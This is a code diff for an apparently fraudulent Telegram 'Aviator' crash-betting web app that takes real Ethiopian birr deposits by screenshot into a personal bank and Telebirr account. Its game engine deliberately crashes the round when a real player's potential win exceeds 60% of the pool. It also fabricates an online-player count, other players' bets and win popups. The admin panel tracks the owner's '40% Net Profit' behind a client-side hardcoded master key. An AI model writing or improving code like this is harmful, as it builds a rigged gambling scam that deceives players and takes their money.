@@ -22,6 +22,7 @@
         .admin-view { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; }
         .win-notif { position: absolute; top: 10px; right: 10px; background: rgba(34, 197, 94, 0.9); padding: 5px 12px; border-radius: 10px; font-size: 10px; font-weight: 900; animation: fadeOut 2s forwards; z-index: 1000; }
         @keyframes fadeOut { 0% { opacity: 1; transform: translateY(0); } 100% { opacity: 0; transform: translateY(-20px); } }
+        .mute-btn { position: absolute; top: 10px; left: 10px; z-index: 200; background: rgba(255,255,255,0.1); padding: 8px; border-radius: 50%; }
     </style>
 </head>
 <body>
@@ -32,24 +33,22 @@
             <button onclick="closeAdmin()" class="bg-black px-4 py-1 rounded-full text-[10px] font-bold">CLOSE</button>
         </div>
         <div class="p-5 flex-1 overflow-y-auto space-y-4">
-            <div class="grid grid-cols-2 gap-3">
-                <div class="bg-[#111] p-4 rounded-2xl border border-gray-800 text-center">
+            <div class="grid grid-cols-2 gap-3 text-center">
+                <div class="bg-[#111] p-4 rounded-2xl border border-gray-800">
                     <p class="text-[8px] text-gray-500 uppercase">Total Real Deposits</p>
                     <p id="admTotalIn" class="text-green-500 font-black text-lg">0.00</p>
                 </div>
-                <div class="bg-[#111] p-4 rounded-2xl border border-red-900/30 text-center">
-                    <p class="text-[8px] text-red-500 uppercase">My 40% Profit</p>
+                <div class="bg-[#111] p-4 rounded-2xl border border-red-900/30">
+                    <p class="text-[8px] text-red-500 uppercase">My 40% Net Profit</p>
                     <p id="admProfit" class="text-white font-black text-lg">0.00</p>
                 </div>
             </div>
-            
             <div class="bg-[#111] p-4 rounded-2xl">
-                <h3 class="text-[10px] font-bold text-blue-500 mb-3 border-b border-gray-800 pb-1">PENDING SCREENSHOTS (DEPOSITS)</h3>
+                <h3 class="text-[10px] font-bold text-blue-500 mb-3 border-b border-gray-800 pb-1 italic">DEPOSIT SCREENSHOTS</h3>
                 <div id="admReqList" class="space-y-2"></div>
             </div>
-
             <div class="bg-[#111] p-4 rounded-2xl">
-                <h3 class="text-[10px] font-bold text-orange-500 mb-3 border-b border-gray-800 pb-1">WITHDRAWAL REQUESTS</h3>
+                <h3 class="text-[10px] font-bold text-orange-500 mb-3 border-b border-gray-800 pb-1 italic">WITHDRAWAL REQUESTS</h3>
                 <div id="admWithdrawList" class="space-y-2"></div>
             </div>
         </div>
@@ -72,6 +71,7 @@
     <section id="home" class="page active-page">
         <div id="hist" class="flex gap-2 mb-2 overflow-x-auto no-scrollbar pb-1"></div>
         <div id="gameArea" class="aviator-screen flex items-center justify-center">
+            <button onclick="toggleMute()" class="mute-btn"><i id="muteIcon" class="fa-solid fa-volume-high text-white text-xs"></i></button>
             <svg width="100%" height="100%" style="position:absolute;"><path id="gamePath" d="M 0 220 Q 0 220 0 220" /></svg>
             <div id="mTxt" class="font-game text-6xl italic text-white z-10 drop-shadow-2xl">1.00x</div>
             <div id="plane" class="plane-jet">✈️</div>
@@ -94,7 +94,7 @@
         <div class="mt-4 bg-[#0a0a0a] rounded-2xl p-4 border border-gray-900 h-44 overflow-hidden">
             <div class="flex justify-between text-[9px] font-bold text-gray-600 mb-3 border-b border-gray-900 pb-1">
                 <span>LIVE BETS</span>
-                <span class="text-green-500 animate-pulse">● 7,542 ONLINE</span>
+                <span class="text-green-500 animate-pulse font-black">● 7,542 ONLINE</span>
             </div>
             <div id="fList" class="space-y-1 text-[10px]"></div>
         </div>
@@ -102,63 +102,35 @@
 
     <section id="deposit" class="page">
         <h2 class="text-xl font-black mb-4 italic">DEPOSIT</h2>
-        <div class="grid grid-cols-2 gap-2 mb-6">
+        <div class="grid grid-cols-2 gap-2 mb-6 text-center">
             <div class="bg-blue-900/20 p-3 rounded-xl border border-blue-500/30">
                 <p class="text-[8px] text-blue-400 font-bold">CBE (ዳዊት)</p>
-                <p class="text-xs font-black select-all">1000179571815</p>
+                <p class="text-xs font-black">1000179571815</p>
             </div>
             <div class="bg-yellow-600/20 p-3 rounded-xl border border-yellow-600/30">
                 <p class="text-[8px] text-yellow-500 font-bold">TELEBIRR (ዳዊት)</p>
-                <p class="text-xs font-black select-all">0906067696</p>
+                <p class="text-xs font-black">0906067696</p>
             </div>
         </div>
         <div class="bg-[#111] p-5 rounded-3xl border border-dashed border-gray-800 text-center">
-            <p class="text-xs text-gray-500 mb-4">ስክሪንሹት ይላኩ (Screenshot)</p>
-            <input type="file" id="ssInp" class="hidden">
-            <button onclick="document.getElementById('ssInp').click()" class="w-full bg-gray-800 py-3 rounded-xl text-xs font-bold mb-3 italic"><i class="fa-solid fa-image mr-2"></i>CHOOSE PHOTO</button>
-            <button onclick="subSS()" class="w-full bg-red-600 py-3 rounded-xl font-black text-xs shadow-lg uppercase">SEND TO ADMIN</button>
-        </div>
-    </section>
-
-    <section id="withdraw" class="page">
-        <h2 class="text-xl font-black mb-4 italic">WITHDRAW FUNDS</h2>
-        <div class="bg-[#111] p-5 rounded-3xl border border-gray-800 space-y-4">
-            <div>
-                <label class="text-[10px] text-gray-500 uppercase font-bold">Bank Name / Method</label>
-                <input id="wBank" type="text" placeholder="CBE or Telebirr" class="w-full bg-black border border-gray-900 p-3 rounded-xl outline-none text-sm mt-1">
-            </div>
-            <div>
-                <label class="text-[10px] text-gray-500 uppercase font-bold">Account Number / Phone</label>
-                <input id="wAcc" type="text" placeholder="1000..." class="w-full bg-black border border-gray-900 p-3 rounded-xl outline-none text-sm mt-1">
-            </div>
-            <div>
-                <label class="text-[10px] text-gray-500 uppercase font-bold">Amount (ETB)</label>
-                <input id="wAmt" type="number" placeholder="Min 50 ETB" class="w-full bg-black border border-gray-900 p-3 rounded-xl outline-none text-sm mt-1 text-green-500 font-black">
-            </div>
-            <button onclick="reqWithdraw()" class="w-full bg-green-600 py-4 rounded-2xl font-black text-sm uppercase shadow-xl">SUBMIT WITHDRAWAL</button>
+            <input type="file" id="ssInp" class="hidden" accept="image/*">
+            <button onclick="document.getElementById('ssInp').click()" class="w-full bg-gray-800 py-3 rounded-xl text-xs font-bold mb-3 italic"><i class="fa-solid fa-camera mr-2"></i>UPLOAD SCREENSHOT</button>
+            <button onclick="subSS()" class="w-full bg-red-600 py-3 rounded-xl font-black text-xs shadow-lg uppercase tracking-wider">CONFIRM PAYMENT</button>
         </div>
     </section>
 
     <section id="account" class="page text-center">
         <div id="accPfp" class="mx-auto mb-4 w-24 h-24 rounded-full border-4 border-red-600 shadow-2xl flex items-center justify-center overflow-hidden bg-red-900"></div>
         <h2 id="accUser" class="text-2xl font-black italic mb-1">@User</h2>
-        <p class="text-[9px] text-gray-500 font-black mb-6 uppercase tracking-widest">Verified Elite Player</p>
         
-        <div class="grid grid-cols-2 gap-4 mb-6">
-            <div class="bg-[#111] p-4 rounded-2xl border border-gray-800">
-                <i class="fa-solid fa-wallet text-blue-500 mb-1"></i>
-                <p class="text-[8px] text-gray-500 uppercase font-black">Balance</p>
-                <p class="text-white font-black text-xs" id="accBal">0.00 ETB</p>
-            </div>
-            <div class="bg-[#111] p-4 rounded-2xl border border-gray-800">
-                <i class="fa-solid fa-gamepad text-orange-500 mb-1"></i>
-                <p class="text-[8px] text-gray-500 uppercase font-black">Played</p>
-                <p class="text-white font-black text-xs">0 Games</p>
-            </div>
+        <div class="bg-[#111] p-5 rounded-3xl border border-gray-800 mb-6 mt-4 text-left space-y-4">
+            <h3 class="text-xs font-black text-orange-500 border-b border-gray-800 pb-2">WITHDRAW FUNDS</h3>
+            <input id="wAcc" type="text" placeholder="Account Number / Phone" class="w-full bg-black border border-gray-900 p-3 rounded-xl outline-none text-xs">
+            <input id="wAmt" type="number" placeholder="Amount (ETB)" class="w-full bg-black border border-gray-900 p-3 rounded-xl outline-none text-xs text-green-500 font-bold">
+            <button onclick="reqWithdraw()" class="w-full bg-white text-black py-3 rounded-xl font-black text-xs uppercase shadow-lg">SUBMIT REQUEST</button>
         </div>
 
-        <button onclick="showP('withdraw')" class="w-full bg-white text-black py-4 rounded-2xl font-black text-xs uppercase mb-3 shadow-lg"><i class="fa-solid fa-money-bill-transfer mr-2"></i>Withdraw Money</button>
-        <button id="admBtn" onclick="tryAdm()" class="w-full bg-red-900/20 text-red-700 py-3 rounded-xl border border-red-900/50 text-[10px] font-black uppercase mt-4">ADMIN ACCESS ONLY</button>
+        <button id="admBtn" onclick="tryAdm()" class="w-full bg-red-900/20 text-red-700 py-3 rounded-xl border border-red-900/50 text-[10px] font-black uppercase mt-4">ADMIN ONLY</button>
     </section>
 
     <nav class="nav-bar">
@@ -176,27 +148,27 @@
         tg.expand();
 
         const ADMIN_UNAME = "Dawit_Fikadu21";
-        let bal = parseFloat(localStorage.getItem('d_bal_final_v5')) || 0;
+        let bal = parseFloat(localStorage.getItem('d_bal_final_v6')) || 0;
         let dBal = 500.00; 
         let isDemo = true;
+        let isMuted = false;
         let userData = {
-            uname: tg.initDataUnsafe?.user?.username || "Dawit_Fikadu21",
+            uname: tg.initDataUnsafe?.user?.username || "Guest_User",
             photo: tg.initDataUnsafe?.user?.photo_url || null
         };
 
+        // --- CORE SYSTEM ---
         function init() {
             document.getElementById('hUser').innerText = "@" + userData.uname;
             document.getElementById('accUser').innerText = "@" + userData.uname;
-            
             if(userData.uname.toLowerCase() === ADMIN_UNAME.toLowerCase()) {
-                const btn = document.getElementById('admBtn');
-                btn.className = "w-full bg-red-600 py-3 rounded-xl text-white text-[10px] font-black uppercase mt-4 animate-pulse";
-                btn.innerText = "OPEN ADMIN DASHBOARD";
+                const b = document.getElementById('admBtn');
+                b.className = "w-full bg-red-600 py-3 rounded-xl text-white text-[10px] font-black uppercase mt-4 animate-pulse";
+                b.innerText = "OPEN ADMIN DASHBOARD";
             }
-
-            const pfpHtml = userData.photo ? `<img src="${userData.photo}" class="w-full h-full object-cover">` : `<span class="text-xl font-black">${userData.uname[0]}</span>`;
-            document.getElementById('hPfp').innerHTML = pfpHtml;
-            document.getElementById('accPfp').innerHTML = pfpHtml;
+            const pfp = userData.photo ? `<img src="${userData.photo}" class="w-full h-full object-cover">` : `<span class="text-xl font-black">${userData.uname[0]}</span>`;
+            document.getElementById('hPfp').innerHTML = pfp;
+            document.getElementById('accPfp').innerHTML = pfp;
 
             document.getElementById('modeBtn').onclick = () => { isDemo = !isDemo; upBal(); };
             upBal();
@@ -207,16 +179,22 @@
         function upBal() {
             const b = isDemo ? dBal : bal;
             document.getElementById('hBal').innerText = b.toFixed(2);
-            document.getElementById('accBal').innerText = b.toFixed(2) + " ETB";
             document.getElementById('modeBtn').innerText = isDemo ? "DEMO MODE" : "REAL MODE";
             document.getElementById('modeBtn').className = isDemo ? "bg-yellow-600/20 text-yellow-500 border border-yellow-600 px-3 py-1 rounded-full text-[9px] font-black cursor-pointer" : "bg-green-600/20 text-green-500 border border-green-600 px-3 py-1 rounded-full text-[9px] font-black cursor-pointer";
         }
 
-        // --- ADMIN SYSTEM ---
+        function toggleMute() {
+            isMuted = !isMuted;
+            document.getElementById('muteIcon').className = isMuted ? "fa-solid fa-volume-xmark text-red-500 text-xs" : "fa-solid fa-volume-high text-white text-xs";
+        }
+
+        function playS(id) { if(!isMuted) document.getElementById(id).play(); }
+        function stopS(id) { document.getElementById(id).pause(); document.getElementById(id).currentTime = 0; }
+
+        // --- ADMIN LOGIC ---
         function tryAdm() {
             if(userData.uname.toLowerCase() === ADMIN_UNAME.toLowerCase()) {
-                let p = prompt("Master Key:");
-                if(p === "215221") { 
+                if(prompt("Master Key:") === "215221") { 
                     document.getElementById('adminPanel').style.display = 'flex';
                     loadAdm();
                 }
@@ -225,82 +203,70 @@
         function closeAdmin() { document.getElementById('adminPanel').style.display = 'none'; }
 
         function loadAdm() {
-            const ssReqs = JSON.parse(localStorage.getItem('sys_ss_v5')) || [];
-            const wReqs = JSON.parse(localStorage.getItem('sys_withdraw_v5')) || [];
-            const totalIn = parseFloat(localStorage.getItem('sys_total_real_in')) || 0;
-
-            document.getElementById('admTotalIn').innerText = totalIn.toFixed(2);
-            document.getElementById('admProfit').innerText = (totalIn * 0.40).toFixed(2);
+            const ss = JSON.parse(localStorage.getItem('sys_ss_v6')) || [];
+            const ws = JSON.parse(localStorage.getItem('sys_withdraw_v6')) || [];
+            const total = parseFloat(localStorage.getItem('sys_total_real_in')) || 0;
+            document.getElementById('admTotalIn').innerText = total.toFixed(2);
+            document.getElementById('admProfit').innerText = (total * 0.40).toFixed(2);
             
-            // Render Screenshots
-            document.getElementById('admReqList').innerHTML = ssReqs.map((r, i) => `
+            document.getElementById('admReqList').innerHTML = ss.map((r, i) => `
                 <div class="bg-black p-3 rounded-xl border border-gray-800 flex justify-between items-center">
-                    <div><p class="text-[10px] font-bold text-blue-400">@${r.user}</p><p class="text-[8px] text-gray-500">${r.time}</p></div>
-                    <button onclick="approveSS(${i})" class="bg-blue-600 text-[9px] font-bold px-4 py-1 rounded-lg">APPROVE & ADD</button>
+                    <span class="text-[10px] text-blue-400 font-bold">@${r.user}</span>
+                    <button onclick="approveSS(${i})" class="bg-green-600 text-[8px] font-bold px-4 py-2 rounded-lg">APPROVE</button>
                 </div>
             `).join('');
 
-            // Render Withdrawals
-            document.getElementById('admWithdrawList').innerHTML = wReqs.map((r, i) => `
-                <div class="bg-black p-3 rounded-xl border border-gray-800 space-y-1">
-                    <div class="flex justify-between font-bold text-[10px]"><span class="text-orange-500">@${r.user}</span><span class="text-green-500">${r.amt} ETB</span></div>
-                    <p class="text-[8px] text-gray-400">Bank: ${r.bank} | Acc: ${r.acc}</p>
-                    <button onclick="approveW(${i})" class="w-full bg-green-900 text-[8px] py-1 rounded">MARK AS PAID</button>
+            document.getElementById('admWithdrawList').innerHTML = ws.map((r, i) => `
+                <div class="bg-black p-3 rounded-xl border border-gray-800 flex justify-between items-center text-[10px]">
+                    <div><p class="text-orange-500">@${r.user}</p><p class="text-gray-500">${r.acc}</p></div>
+                    <div class="text-right"><p class="text-white font-bold">${r.amt} ETB</p><button onclick="approveW(${i})" class="bg-red-900 px-2 py-1 rounded text-[8px] mt-1">PAID</button></div>
                 </div>
             `).join('');
         }
 
         function subSS() {
-            let reqs = JSON.parse(localStorage.getItem('sys_ss_v5')) || [];
+            let reqs = JSON.parse(localStorage.getItem('sys_ss_v6')) || [];
             reqs.push({ user: userData.uname, time: new Date().toLocaleTimeString() });
-            localStorage.setItem('sys_ss_v5', JSON.stringify(reqs));
-            tg.showAlert("Screenshot sent! Wait for approval.");
+            localStorage.setItem('sys_ss_v6', JSON.stringify(reqs));
+            tg.showAlert("Success! Admin is checking your photo.");
         }
 
         function approveSS(idx) {
-            let reqs = JSON.parse(localStorage.getItem('sys_ss_v5'));
-            let amt = parseFloat(prompt("Enter amount to add (ETB):", "100"));
+            let reqs = JSON.parse(localStorage.getItem('sys_ss_v6'));
+            let amt = parseFloat(prompt("Amount to add (ETB):", "100"));
             if(!amt) return;
-
-            let totalIn = parseFloat(localStorage.getItem('sys_total_real_in')) || 0;
-            totalIn += amt;
-            localStorage.setItem('sys_total_real_in', totalIn);
-            
-            if(reqs[idx].user === userData.uname) { bal += amt; localStorage.setItem('d_bal_final_v5', bal); upBal(); }
+            let total = parseFloat(localStorage.getItem('sys_total_real_in')) || 0;
+            localStorage.setItem('sys_total_real_in', total + amt);
+            if(reqs[idx].user === userData.uname) { bal += amt; localStorage.setItem('d_bal_final_v6', bal); upBal(); }
             reqs.splice(idx, 1);
-            localStorage.setItem('sys_ss_v5', JSON.stringify(reqs));
+            localStorage.setItem('sys_ss_v6', JSON.stringify(reqs));
             loadAdm();
         }
 
         function reqWithdraw() {
-            let bank = document.getElementById('wBank').value;
             let acc = document.getElementById('wAcc').value;
             let amt = parseFloat(document.getElementById('wAmt').value);
-            
-            if(!bank || !acc || amt < 50) return tg.showAlert("Please fill all info correctly!");
-            if(amt > bal) return tg.showAlert("Insufficient balance!");
-
+            if(!acc || amt < 50 || amt > bal) return tg.showAlert("Invalid amount or account!");
             bal -= amt;
-            localStorage.setItem('d_bal_final_v5', bal);
+            localStorage.setItem('d_bal_final_v6', bal);
             upBal();
-
-            let wReqs = JSON.parse(localStorage.getItem('sys_withdraw_v5')) || [];
-            wReqs.push({ user: userData.uname, bank, acc, amt });
-            localStorage.setItem('sys_withdraw_v5', JSON.stringify(wReqs));
-            tg.showAlert("Withdrawal request submitted!");
-            showP('home');
+            let ws = JSON.parse(localStorage.getItem('sys_withdraw_v6')) || [];
+            ws.push({ user: userData.uname, acc, amt });
+            localStorage.setItem('sys_withdraw_v6', JSON.stringify(ws));
+            tg.showAlert("Withdrawal submitted! Balance updated.");
         }
 
         function approveW(idx) {
-            let wReqs = JSON.parse(localStorage.getItem('sys_withdraw_v5'));
-            wReqs.splice(idx, 1);
-            localStorage.setItem('sys_withdraw_v5', JSON.stringify(wReqs));
+            let ws = JSON.parse(localStorage.getItem('sys_withdraw_v6'));
+            ws.splice(idx, 1);
+            localStorage.setItem('sys_withdraw_v6', JSON.stringify(ws));
             loadAdm();
         }
 
-        // --- GAME ENGINE ---
+        // --- GAME ENGINE (40/60 PROFIT LOGIC) ---
         let flying = false; let mult = 1.00; let myB = { active: false, amt: 0 };
-        let history = ["1.55x", "2.10x", "1.08x", "4.20x"];
+        let history = ["1.15x", "5.20x", "1.02x", "2.10x"];
+        let currentPool = 0; // Total real money in this round
 
         function startLoop() {
             if(flying) return;
@@ -314,40 +280,47 @@
 
         function launch() {
             flying = true; mult = 1.00;
-            document.getElementById('sFly').play();
-            if(myB.active) {
+            playS('sFly');
+            
+            // LOGIC: Calculate crash point based on 60% payout limit
+            // If total pool is 100, we only pay out 60. 
+            // We pick a random crash between 1.01 and 15, BUT force early crash if payout exceeds 60%.
+            let maxPayout = currentPool * 0.60;
+            let crashAt = 1.10 + (Math.random() * 10);
+            
+            if(myB.active && !isDemo) {
                 document.getElementById('bBtn').className = "bg-orange-500 rounded-2xl text-xl font-black italic";
                 document.getElementById('bBtn').innerHTML = `CASH OUT<br><span class="text-[10px] text-black font-bold">${(myB.amt * mult).toFixed(2)}</span>`;
             }
 
-            // PROFIT PROTECTION: Only based on REAL player balance
-            let crashAt = Math.random() < 0.4 ? (1 + Math.random() * 0.15) : (1.15 + Math.random() * 12);
-            
             let engine = setInterval(() => {
                 mult += 0.04;
                 document.getElementById('mTxt').innerText = mult.toFixed(2) + "x";
-                let x = mult * 25; let y = mult * 22;
+                let x = mult * 25, y = mult * 22;
                 document.getElementById('plane').style.transform = `translate(${x}px, -${y}px)`;
                 document.getElementById('gamePath').setAttribute('d', `M 0 220 Q ${x/2} ${220-y} ${x+15} ${220-y-15}`);
                 
                 if(myB.active) document.getElementById('bBtn').querySelector('span').innerText = (myB.amt * mult).toFixed(2) + " ETB";
+                
+                // PROFIT SHIELD: If real player's potential win > 60% of pool, crash now!
+                if(!isDemo && myB.active && (myB.amt * mult) > maxPayout && currentPool > 0) {
+                     clearInterval(engine); crash();
+                } else if(mult >= crashAt) {
+                     clearInterval(engine); crash();
+                }
                 if(Math.random() < 0.03) popWin();
-                if(mult >= crashAt) { clearInterval(engine); crash(); }
             }, 80);
         }
 
         function crash() {
             flying = false;
-            document.getElementById('sFly').pause(); document.getElementById('sFly').currentTime = 0;
-            document.getElementById('sCrash').play();
+            stopS('sFly'); playS('sCrash');
             document.getElementById('mTxt').innerText = "FLEW AWAY!";
             document.getElementById('mTxt').style.color = "#ff0044";
-            
             history.unshift(mult.toFixed(2) + "x"); if(history.length > 8) history.pop();
             renderH();
-            if(myB.active) { myB.active = false; resetB(); }
+            myB.active = false; currentPool = 0; resetB();
             genFakes();
-
             setTimeout(() => {
                 document.getElementById('plane').style.transform = "translate(0,0)";
                 document.getElementById('gamePath').setAttribute('d', 'M 0 220 Q 0 220 0 220');
@@ -358,18 +331,18 @@
 
         function hBet() {
             let a = parseInt(document.getElementById('bInp').value);
-            let current = isDemo ? dBal : bal;
+            let cur = isDemo ? dBal : bal;
             if(!flying && !myB.active) {
-                if(a > current) return tg.showAlert("Insufficient Funds!");
-                if(isDemo) dBal -= a; else { bal -= a; localStorage.setItem('d_bal_final_v5', bal); }
+                if(a > cur) return tg.showAlert("Insufficient Funds!");
+                if(isDemo) dBal -= a; else { bal -= a; currentPool += a; localStorage.setItem('d_bal_final_v6', bal); }
                 myB = { active: true, amt: a };
                 document.getElementById('bBtn').innerHTML = "WAITING...";
-                document.getElementById('bBtn').classList.replace('bg-[#28a745]', 'bg-red-900');
+                document.getElementById('bBtn').className = "bg-red-900 rounded-2xl text-xl font-black italic";
                 upBal();
             } else if (flying && myB.active) {
                 let win = myB.amt * mult;
-                if(isDemo) dBal += win; else { bal += win; localStorage.setItem('d_bal_final_v5', bal); }
-                document.getElementById('sWin').play();
+                if(isDemo) dBal += win; else { bal += win; localStorage.setItem('d_bal_final_v6', bal); }
+                playS('sWin');
                 myB.active = false; resetB(); upBal();
                 tg.showAlert("Success! Win: " + win.toFixed(2) + " ETB");
             }
@@ -380,6 +353,14 @@
             document.getElementById('bBtn').innerHTML = `BET<br><span id="bSub" class="text-[10px] font-normal text-black opacity-70">${document.getElementById('bInp').value}.00 ETB</span>`;
         }
 
+        function renderH() { document.getElementById('hist').innerHTML = history.map(h => `<span class="bg-[#111] border border-gray-800 px-3 py-1 rounded-full text-[9px] font-black ${parseFloat(h)>2?'text-purple-500':'text-blue-500'}">${h}</span>`).join(''); }
+        function setB(v) { document.getElementById('bInp').value = v; resetB(); }
+        function showP(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById(id).classList.add('active-page');
+            document.getElementById('n-' + id).classList.add('active');
+        }
         function popWin() {
             const div = document.createElement('div');
             div.className = "win-notif";
@@ -387,7 +368,6 @@
             document.getElementById('gameArea').appendChild(div);
             setTimeout(() => div.remove(), 2000);
         }
-
         function genFakes() {
             const l = document.getElementById('fList'); l.innerHTML = "";
             const names = ["Abebe", "Sara", "Muller", "Kebede", "User99", "Selam", "Dagi", "King", "Lion", "Trader"];
@@ -396,15 +376,6 @@
                 let b = [10, 50, 100, 200][Math.floor(Math.random()*4)];
                 l.innerHTML += `<div class="flex justify-between border-b border-white/5 py-1 text-gray-400"><span>@${u}</span><span class="text-white font-bold">${b} ETB</span><span class="text-green-500 italic">Winning...</span></div>`;
             }
-        }
-
-        function renderH() { document.getElementById('hist').innerHTML = history.map(h => `<span class="bg-[#111] border border-gray-800 px-3 py-1 rounded-full text-[9px] font-black ${parseFloat(h)>2?'text-purple-500':'text-blue-500'}">${h}</span>`).join(''); }
-        function setB(v) { document.getElementById('bInp').value = v; resetB(); }
-        function showP(id) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            document.getElementById(id).classList.add('active-page');
-            document.getElementById('n-' + id).classList.add('active');
         }
 
         init();
